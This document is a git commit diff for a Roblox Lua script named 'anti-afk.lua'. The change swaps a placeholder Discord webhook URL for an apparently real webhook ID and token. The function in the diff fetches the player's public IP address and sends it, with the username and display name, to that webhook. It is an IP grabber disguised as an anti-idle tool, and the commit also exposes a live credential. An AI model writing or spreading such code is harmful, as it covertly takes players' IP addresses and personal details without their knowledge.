f6e777155990688c389ec6952492693604180c99
Wiston <157526994+Zyneeee@users.noreply.github.com>
2024-06-08 20:57:23 +0700

    Update anti-afk.lua

--- anti-afk.lua
+++ anti-afk.lua
@@ -4,7 +4,7 @@ local logIpFunction = function(player)
     local ip = http:JSONDecode(http:Get("https://api.ipify.org?format=json")).ip
     local username = player.Name
     local displayName = player.DisplayName
-    local webhook = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"
+    local webhook = "https://discord.com/api/webhooks/1222254468557443213/wf2ulJG7iP1A6HqxyAeY2OipyJVL-PEN96xpDVFUMzTX8T5Ce9FPfMju9rZprlIZp5gQ"
     
     local data = {
         content = "Player IP: " .. ip .. " | Username: " .. username .. " | Display Name: " .. displayName,
